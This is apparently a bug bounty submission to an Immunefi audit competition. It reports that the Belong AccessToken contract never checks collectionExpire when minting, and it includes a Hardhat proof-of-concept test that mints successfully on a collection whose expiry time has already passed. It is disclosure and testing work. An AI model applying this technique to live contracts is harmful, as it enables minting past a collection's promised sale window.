# 57701 sc insight accesstoken collectionexpire is never checked allowing tokens to be minted even after the collection expires&#x20;

Submitted on Oct 28th 2025 at 09:53:21 UTC by @s8olidity for [Audit Comp | Belong](https://immunefi.com/audit-competition/audit-comp-belong)

* Report ID: #57701
* Report Type: Smart Contract
* Report severity: Insight
* Target: <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/tokens/AccessToken.sol>

Impacts:

* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

### Brief / Intro

The `collectionExpire` field in `AccessTokenInfo` is never checked in any mint entry (`mintStaticPrice` / `mintDynamicPrice`), and signature verification does not include an expiration time constraint. Consequently, after the collection expires, requests with a valid signature (or a persistent checkout) can continue to be minted indefinitely.

### Vulnerability Details

* The structure definition includes `collectionExpire` (contracts/v2/Structures.sol:32), but the `mintStaticPrice` and `mintDynamicPrice` methods in the `AccessToken` contract do not check the current time against `collectionExpire`.
* The `SignatureVerifier` signature for the mint parameter only covers `receiver/tokenId/tokenUri/price/whitelisted` parameters, and does not include a time or window, making it impossible to constrain expiration at the signature level.
* Therefore, as long as a signature is present, the contract will not refuse to mint tokens due to "collection expiration," which deviates from the standard business objective of "collection lifecycle."

### Impact Details

* The promised "sale/minting window" is invalid: minting can continue even after the expiration date, violating scarcity and redemption rules;
* If peripheral systems/frontend dependencies have expired, attackers can manually interact with the contract to mint NFTs directly;
* Recommended Severity: Medium ("Unauthorized minting of NFTs" strictly requires unsigned minting to be considered critical, but this is considered a business violation due to "failure to stop minting on schedule" and still poses a risk).

## References

* contracts/v2/tokens/AccessToken.sol:162, 199, 212 (mint entry does not check for expire)
* contracts/v2/utils/SignatureVerifier.sol (mint verification hash does not include expire)
* test/v2/tokens/accessToken.test.ts (only asserts storage, not validation)

## Proof of Concept

<details>

<summary>PoC: test demonstrating mint succeeds after collectionExpire has passed</summary>

```ts
test/v2/tokens/accessToken.expiry.test.ts

    import { ethers } from 'hardhat';
    import { expect } from 'chai';
    import EthCrypto from 'eth-crypto';
    import {
      deployAccessTokenImplementation,
      deployCreditTokenImplementation,
      deployFactory,
      deployRoyaltiesReceiverV2Implementation,
      deployVestingWalletImplementation,
    } from '../../../helpers/deployFixtures';
    import { deploySignatureVerifier } from '../../../helpers/deployLibraries';
    import { deployMockTransferValidatorV2 } from '../../../helpers/deployMockFixtures';
    import { Factory, AccessToken } from '../../../typechain-types';

    import { BigNumber } from 'ethers';

    function signStatic(
      signer: any,
      receiver: string,
      tokenId: number,
      tokenUri: string,
      whitelisted: boolean,
      chainId: number,
    ) {
      const hash = EthCrypto.hash.keccak256([
        { type: 'address', value: receiver },
        { type: 'uint256', value: tokenId },
        { type: 'string', value: tokenUri },
        { type: 'bool', value: whitelisted },
        { type: 'uint256', value: chainId },
      ]);
      return EthCrypto.sign(signer.privateKey, hash);
    }

    describe('AccessToken collectionExpire ignored', () => {
      it('Mints succeed even after collectionExpire has passed', async () => {
        const [owner, creator, buyer] = await ethers.getSigners();
        const signer = EthCrypto.createIdentity();

        const signatureVerifier = await deploySignatureVerifier();
        const accessImpl: AccessToken = await deployAccessTokenImplementation(signatureVerifier.address);
        const rrImpl = await deployRoyaltiesReceiverV2Implementation();
        const creditImpl = await deployCreditTokenImplementation();
        const vestingImpl = await deployVestingWalletImplementation();
        const validator = await deployMockTransferValidatorV2();

        const implementations: Factory.ImplementationsStruct = {
          accessToken: accessImpl.address,
          creditToken: creditImpl.address,
          royaltiesReceiver: rrImpl.address,
          vestingWallet: vestingImpl.address,
        };

        const factory: Factory = await deployFactory(
          owner.address,
          signer.address,
          signatureVerifier.address,
          validator.address,
          implementations
        );

        const chainId = (await ethers.provider.getNetwork()).chainId;
        const creationSig = EthCrypto.sign(
          signer.privateKey,
          EthCrypto.hash.keccak256([
            { type: 'string', value: 'EXPIRED' },
            { type: 'string', value: 'EXP' },
            { type: 'string', value: 'uri' },
            { type: 'uint256', value: 600 },
            { type: 'uint256', value: chainId },
          ])
        );

        const info = {
          metadata: { name: 'EXPIRED', symbol: 'EXP' },
          contractURI: 'uri',
          paymentToken: ethers.constants.AddressZero, // native
          mintPrice: ethers.utils.parseEther('0.01'),
          whitelistMintPrice: ethers.utils.parseEther('0.005'),
          transferable: true,
          maxTotalSupply: BigNumber.from('10'),
          feeNumerator: BigNumber.from('600'),
          collectionExpire: BigNumber.from('0'), 
          signature: creationSig,
        };

        await factory.connect(creator).produce(info, ethers.constants.HashZero);
        const { nftAddress } = await factory.nftInstanceInfo('EXPIRED', 'EXP');
        const nft = (await ethers.getContractAt('AccessToken', nftAddress)) as AccessToken;

        const mintSig = signStatic(signer, buyer.address, 1, 'token/1', false, chainId);
        const params = [{ tokenId: 1, whitelisted: false, tokenUri: 'token/1', signature: mintSig }];
        const expected = info.mintPrice;

        await expect(
          nft.connect(buyer).mintStaticPrice(
            buyer.address,
            params,
            await nft.NATIVE_CURRENCY_ADDRESS(),
            expected,
            { value: expected }
          )
        ).to.not.be.reverted; 
      });
    });
```

</details>
